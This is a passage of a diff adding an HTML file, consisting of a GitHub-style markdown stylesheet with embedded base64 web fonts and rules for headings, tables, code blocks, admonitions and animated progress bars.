@@ -1,0 +1,2593 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><style>body {
+  max-width: 980px;
+  border: 1px solid #ddd;
+  outline: 1300px solid #fff;
+  margin: 16px auto;
+}
+
+body .markdown-body
+{
+  padding: 45px;
+}
+
+@font-face {
+  font-family: fontawesome-mini;
+  src: url(data:font/woff;charset=utf-8;base64,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) format('woff');
+}
+
+@font-face {
+  font-family: octicons-anchor;
+  src: url(data:font/woff;charset=utf-8;base64,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) format('woff');
+}
+
+.markdown-body {
+  font-family: sans-serif;
+  -ms-text-size-adjust: 100%;
+  -webkit-text-size-adjust: 100%;
+  color: #333333;
+  overflow: hidden;
+  font-family: "Helvetica Neue", Helvetica, "Segoe UI", Arial, freesans, sans-serif;
+  font-size: 16px;
+  line-height: 1.6;
+  word-wrap: break-word;
+}
+
+.markdown-body a {
+  background: transparent;
+}
+
+.markdown-body a:active,
+.markdown-body a:hover {
+  outline: 0;
+}
+
+.markdown-body b,
+.markdown-body strong {
+  font-weight: bold;
+}
+
+.markdown-body mark {
+  background: #ff0;
+  color: #000;
+  font-style: italic;
+  font-weight: bold;
+}
+
+.markdown-body sub,
+.markdown-body sup {
+  font-size: 75%;
+  line-height: 0;
+  position: relative;
+  vertical-align: baseline;
+}
+.markdown-body sup {
+  top: -0.5em;
+}
+.markdown-body sub {
+  bottom: -0.25em;
+}
+
+.markdown-body h1 {
+  font-size: 2em;
+  margin: 0.67em 0;
+}
+
+.markdown-body img {
+  border: 0;
+}
+
+.markdown-body hr {
+  -moz-box-sizing: content-box;
+  box-sizing: content-box;
+  height: 0;
+}
+
+.markdown-body pre {
+  overflow: auto;
+}
+
+.markdown-body code,
+.markdown-body kbd,
+.markdown-body pre,
+.markdown-body samp {
+  font-family: monospace, monospace;
+  font-size: 1em;
+}
+
+.markdown-body input {
+  color: inherit;
+  font: inherit;
+  margin: 0;
+}
+
+.markdown-body html input[disabled] {
+  cursor: default;
+}
+
+.markdown-body input {
+  line-height: normal;
+}
+
+.markdown-body input[type="checkbox"] {
+  box-sizing: border-box;
+  padding: 0;
+}
+
+.markdown-body table {
+  border-collapse: collapse;
+  border-spacing: 0;
+}
+
+.markdown-body td,
+.markdown-body th {
+  padding: 0;
+}
+
+.markdown-body .codehilitetable {
+  border: 0;
+  border-spacing: 0;
+}
+
+.markdown-body .codehilitetable tr {
+  border: 0;
+}
+
+.markdown-body .codehilitetable pre,
+.markdown-body .codehilitetable div.codehilite {
+  margin: 0;
+}
+
+.markdown-body .linenos,
+.markdown-body .code,
+.markdown-body .codehilitetable td {
+  border: 0;
+  padding: 0;
+}
+
+.markdown-body td:not(.linenos) .linenodiv {
+  padding: 0 !important;
+}
+
+.markdown-body .code {
+  width: 100%;
+}
+
+.markdown-body .linenos div pre,
+.markdown-body .linenodiv pre,
+.markdown-body .linenodiv {
+  border: 0;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-left-radius: 3px;
+  -webkit-border-bottom-left-radius: 3px;
+  -moz-border-radius-topleft: 3px;
+  -moz-border-radius-bottomleft: 3px;
+  border-top-left-radius: 3px;
+  border-bottom-left-radius: 3px;
+}
+
+.markdown-body .code div pre,
+.markdown-body .code div {
+  border: 0;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-right-radius: 3px;
+  -webkit-border-bottom-right-radius: 3px;
+  -moz-border-radius-topright: 3px;
+  -moz-border-radius-bottomright: 3px;
+  border-top-right-radius: 3px;
+  border-bottom-right-radius: 3px;
+}
+
+.markdown-body * {
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+}
+
+.markdown-body input {
+  font: 13px Helvetica, arial, freesans, clean, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
+  line-height: 1.4;
+}
+
+.markdown-body a {
+  color: #4183c4;
+  text-decoration: none;
+}
+
+.markdown-body a:hover,
+.markdown-body a:focus,
+.markdown-body a:active {
+  text-decoration: underline;
+}
+
+.markdown-body hr {
+  height: 0;
+  margin: 15px 0;
+  overflow: hidden;
+  background: transparent;
+  border: 0;
+  border-bottom: 1px solid #ddd;
+}
+
+.markdown-body hr:before,
+.markdown-body hr:after {
+  display: table;
+  content: " ";
+}
+
+.markdown-body hr:after {
+  clear: both;
+}
+
+.markdown-body h1,
+.markdown-body h2,
+.markdown-body h3,
+.markdown-body h4,
+.markdown-body h5,
+.markdown-body h6 {
+  margin-top: 15px;
+  margin-bottom: 15px;
+  line-height: 1.1;
+}
+
+.markdown-body h1 {
+  font-size: 30px;
+}
+
+.markdown-body h2 {
+  font-size: 21px;
+}
+
+.markdown-body h3 {
+  font-size: 16px;
+}
+
+.markdown-body h4 {
+  font-size: 14px;
+}
+
+.markdown-body h5 {
+  font-size: 12px;
+}
+
+.markdown-body h6 {
+  font-size: 11px;
+}
+
+.markdown-body blockquote {
+  margin: 0;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+  padding: 0;
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body ol ol,
+.markdown-body ul ol {
+  list-style-type: lower-roman;
+}
+
+.markdown-body ul ul ol,
+.markdown-body ul ol ol,
+.markdown-body ol ul ol,
+.markdown-body ol ol ol {
+  list-style-type: lower-alpha;
+}
+
+.markdown-body dd {
+  margin-left: 0;
+}
+
+.markdown-body code,
+.markdown-body pre,
+.markdown-body samp {
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  font-size: 12px;
+}
+
+.markdown-body pre {
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body kbd {
+  background-color: #e7e7e7;
+  background-image: -moz-linear-gradient(#fefefe, #e7e7e7);
+  background-image: -webkit-linear-gradient(#fefefe, #e7e7e7);
+  background-image: linear-gradient(#fefefe, #e7e7e7);
+  background-repeat: repeat-x;
+  border-radius: 2px;
+  border: 1px solid #cfcfcf;
+  color: #000;
+  padding: 3px 5px;
+  line-height: 10px;
+  font: 11px Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  display: inline-block;
+}
+
+.markdown-body>*:first-child {
+  margin-top: 0 !important;
+}
+
+.markdown-body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+.markdown-body .headeranchor-link {
+  position: absolute;
+  top: 0;
+  bottom: 0;
+  left: 0;
+  display: block;
+  padding-right: 6px;
+  padding-left: 30px;
+  margin-left: -30px;
+}
+
+.markdown-body .headeranchor-link:focus {
+  outline: none;
+}
+
+.markdown-body h1,
+.markdown-body h2,
+.markdown-body h3,
+.markdown-body h4,
+.markdown-body h5,
+.markdown-body h6 {
+  position: relative;
+  margin-top: 1em;
+  margin-bottom: 16px;
+  font-weight: bold;
+  line-height: 1.4;
+}
+
+.markdown-body h1 .headeranchor,
+.markdown-body h2 .headeranchor,
+.markdown-body h3 .headeranchor,
+.markdown-body h4 .headeranchor,
+.markdown-body h5 .headeranchor,
+.markdown-body h6 .headeranchor {
+  display: none;
+  color: #000;
+  vertical-align: middle;
+}
+
+.markdown-body h1:hover .headeranchor-link,
+.markdown-body h2:hover .headeranchor-link,
+.markdown-body h3:hover .headeranchor-link,
+.markdown-body h4:hover .headeranchor-link,
+.markdown-body h5:hover .headeranchor-link,
+.markdown-body h6:hover .headeranchor-link {
+  height: 1em;
+  padding-left: 8px;
+  margin-left: -30px;
+  line-height: 1;
+  text-decoration: none;
+}
+
+.markdown-body h1:hover .headeranchor-link .headeranchor,
+.markdown-body h2:hover .headeranchor-link .headeranchor,
+.markdown-body h3:hover .headeranchor-link .headeranchor,
+.markdown-body h4:hover .headeranchor-link .headeranchor,
+.markdown-body h5:hover .headeranchor-link .headeranchor,
+.markdown-body h6:hover .headeranchor-link .headeranchor {
+  display: inline-block;
+}
+
+.markdown-body h1 {
+  padding-bottom: 0.3em;
+  font-size: 2.25em;
+  line-height: 1.2;
+  border-bottom: 1px solid #eee;
+}
+
+.markdown-body h2 {
+  padding-bottom: 0.3em;
+  font-size: 1.75em;
+  line-height: 1.225;
+  border-bottom: 1px solid #eee;
+}
+
+.markdown-body h3 {
+  font-size: 1.5em;
+  line-height: 1.43;
+}
+
+.markdown-body h4 {
+  font-size: 1.25em;
+}
+
+.markdown-body h5 {
+  font-size: 1em;
+}
+
+.markdown-body h6 {
+  font-size: 1em;
+  color: #777;
+}
+
+.markdown-body p,
+.markdown-body blockquote,
+.markdown-body ul,
+.markdown-body ol,
+.markdown-body dl,
+.markdown-body table,
+.markdown-body pre,
+.markdown-body .admonition {
+  margin-top: 0;
+  margin-bottom: 16px;
+}
+
+.markdown-body hr {
+  height: 4px;
+  padding: 0;
+  margin: 16px 0;
+  background-color: #e7e7e7;
+  border: 0 none;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+  padding-left: 2em;
+}
+
+.markdown-body ul ul,
+.markdown-body ul ol,
+.markdown-body ol ol,
+.markdown-body ol ul {
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body li>p {
+  margin-top: 16px;
+}
+
+.markdown-body dl {
+  padding: 0;
+}
+
+.markdown-body dl dt {
+  padding: 0;
+  margin-top: 16px;
+  font-size: 1em;
+  font-style: italic;
+  font-weight: bold;
+}
+
+.markdown-body dl dd {
+  padding: 0 16px;
+  margin-bottom: 16px;
+}
+
+.markdown-body blockquote {
+  padding: 0 15px;
+  color: #777;
+  border-left: 4px solid #ddd;
+}
+
+.markdown-body blockquote>:first-child {
+  margin-top: 0;
+}
+
+.markdown-body blockquote>:last-child {
+  margin-bottom: 0;
+}
+
+.markdown-body table {
+  display: block;
+  width: 100%;
+  overflow: auto;
+  word-break: normal;
+  word-break: keep-all;
+}
+
+.markdown-body table th {
+  font-weight: bold;
+}
+
+.markdown-body table th,
+.markdown-body table td {
+  padding: 6px 13px;
+  border: 1px solid #ddd;
+}
+
+.markdown-body table tr {
+  background-color: #fff;
+  border-top: 1px solid #ccc;
+}
+
+.markdown-body table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+.markdown-body img {
+  max-width: 100%;
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+}
+
+.markdown-body code,
+.markdown-body samp {
+  padding: 0;
+  padding-top: 0.2em;
+  padding-bottom: 0.2em;
+  margin: 0;
+  font-size: 85%;
+  background-color: rgba(0,0,0,0.04);
+  border-radius: 3px;
+}
+
+.markdown-body code:before,
+.markdown-body code:after {
+  letter-spacing: -0.2em;
+  content: "\00a0";
+}
+
+.markdown-body pre>code {
+  padding: 0;
+  margin: 0;
+  font-size: 100%;
+  word-break: normal;
+  white-space: pre;
+  background: transparent;
+  border: 0;
+}
+
+.markdown-body .codehilite {
+  margin-bottom: 16px;
+}
+
+.markdown-body .codehilite pre,
+.markdown-body pre {
+  padding: 16px;
+  overflow: auto;
+  font-size: 85%;
+  line-height: 1.45;
+  background-color: #f7f7f7;
+  border-radius: 3px;
+}
+
+.markdown-body .codehilite pre {
+  margin-bottom: 0;
+  word-break: normal;
+}
+
+.markdown-body pre {
+  word-wrap: normal;
+}
+
+.markdown-body pre code {
+  display: inline;
+  max-width: initial;
+  padding: 0;
+  margin: 0;
+  overflow: initial;
+  line-height: inherit;
+  word-wrap: normal;
+  background-color: transparent;
+  border: 0;
+}
+
+.markdown-body pre code:before,
+.markdown-body pre code:after {
+  content: normal;
+}
+
+/* Admonition */
+.markdown-body .admonition {
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  position: relative;
+  border-radius: 3px;
+  border: 1px solid #e0e0e0;
+  border-left: 6px solid #333;
+  padding: 10px 10px 10px 30px;
+}
+
+.markdown-body .admonition table {
+  color: #333;
+}
+
+.markdown-body .admonition p {
+  padding: 0;
+}
+
+.markdown-body .admonition-title {
+  font-weight: bold;
+  margin: 0;
+}
+
+.markdown-body .admonition>.admonition-title {
+  color: #333;
+}
+
+.markdown-body .attention>.admonition-title {
+  color: #a6d796;
+}
+
+.markdown-body .caution>.admonition-title {
+  color: #d7a796;
+}
+
+.markdown-body .hint>.admonition-title {
+  color: #96c6d7;
+}
+
+.markdown-body .danger>.admonition-title {
+  color: #c25f77;
+}
+
+.markdown-body .question>.admonition-title {
+  color: #96a6d7;
+}
+
+.markdown-body .note>.admonition-title {
+  color: #d7c896;
+}
+
+.markdown-body .admonition:before,
+.markdown-body .attention:before,
+.markdown-body .caution:before,
+.markdown-body .hint:before,
+.markdown-body .danger:before,
+.markdown-body .question:before,
+.markdown-body .note:before {
+  font: normal normal 16px fontawesome-mini;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+  line-height: 1.5;
+  color: #333;
+  position: absolute;
+  left: 0;
+  top: 0;
+  padding-top: 10px;
+  padding-left: 10px;
+}
+
+.markdown-body .admonition:before {
+  content: "\f056\00a0";
+  color: 333;
+}
+
+.markdown-body .attention:before {
+  content: "\f058\00a0";
+  color: #a6d796;
+}
+
+.markdown-body .caution:before {
+  content: "\f06a\00a0";
+  color: #d7a796;
+}
+
+.markdown-body .hint:before {
+  content: "\f05a\00a0";
+  color: #96c6d7;
+}
+
+.markdown-body .danger:before {
+  content: "\f057\00a0";
+  color: #c25f77;
+}
+
+.markdown-body .question:before {
+  content: "\f059\00a0";
+  color: #96a6d7;
+}
+
+.markdown-body .note:before {
+  content: "\f040\00a0";
+  color: #d7c896;
+}
+
+.markdown-body .admonition::after {
+  content: normal;
+}
+
+.markdown-body .attention {
+  border-left: 6px solid #a6d796;
+}
+
+.markdown-body .caution {
+  border-left: 6px solid #d7a796;
+}
+
+.markdown-body .hint {
+  border-left: 6px solid #96c6d7;
+}
+
+.markdown-body .danger {
+  border-left: 6px solid #c25f77;
+}
+
+.markdown-body .question {
+  border-left: 6px solid #96a6d7;
+}
+
+.markdown-body .note {
+  border-left: 6px solid #d7c896;
+}
+
+.markdown-body .admonition>*:first-child {
+  margin-top: 0 !important;
+}
+
+.markdown-body .admonition>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* progress bar*/
+.markdown-body .progress {
+  display: block;
+  width: 300px;
+  margin: 10px 0;
+  height: 24px;
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  background-color: #ededed;
+  position: relative;
+  box-shadow: inset -1px 1px 3px rgba(0, 0, 0, .1);
+}
+
+.markdown-body .progress-label {
+  position: absolute;
+  text-align: center;
+  font-weight: bold;
+  width: 100%; margin: 0;
+  line-height: 24px;
+  color: #333;
+  text-shadow: 1px 1px 0 #fefefe, -1px -1px 0 #fefefe, -1px 1px 0 #fefefe, 1px -1px 0 #fefefe, 0 1px 0 #fefefe, 0 -1px 0 #fefefe, 1px 0 0 #fefefe, -1px 0 0 #fefefe, 1px 1px 2px #000;
+  -webkit-font-smoothing: antialiased !important;
+  white-space: nowrap;
+  overflow: hidden;
+}
+
+.markdown-body .progress-bar {
+  height: 24px;
+  float: left;
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  background-color: #96c6d7;
+  box-shadow: inset 0 1px 0 rgba(255, 255, 255, .5), inset 0 -1px 0 rgba(0, 0, 0, .1);
+  background-size: 30px 30px;
+  background-image: -webkit-linear-gradient(
+    135deg, rgba(255, 255, 255, .4) 27%,
+    transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%,
+    transparent 77%, transparent
+  );
+  background-image: -moz-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: -ms-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: -o-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+}
+
+.markdown-body .progress-100plus .progress-bar {
+  background-color: #a6d796;
+}
+
+.markdown-body .progress-80plus .progress-bar {
+  background-color: #c6d796;
+}
+
+.markdown-body .progress-60plus .progress-bar {
+  background-color: #d7c896;
+}
+
+.markdown-body .progress-40plus .progress-bar {
+  background-color: #d7a796;
+}
+
+.markdown-body .progress-20plus .progress-bar {
+  background-color: #d796a6;
+}
+
+.markdown-body .progress-0plus .progress-bar {
+  background-color: #c25f77;
+}
+
+.markdown-body .candystripe-animate .progress-bar{
+  -webkit-animation: animate-stripes 3s linear infinite;
+  -moz-animation: animate-stripes 3s linear infinite;
+  animation: animate-stripes 3s linear infinite;
+}
+
+@-webkit-keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+@-moz-keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+@keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+.markdown-body .gloss .progress-bar {
+  box-shadow:
+    inset 0 4px 12px rgba(255, 255, 255, .7),
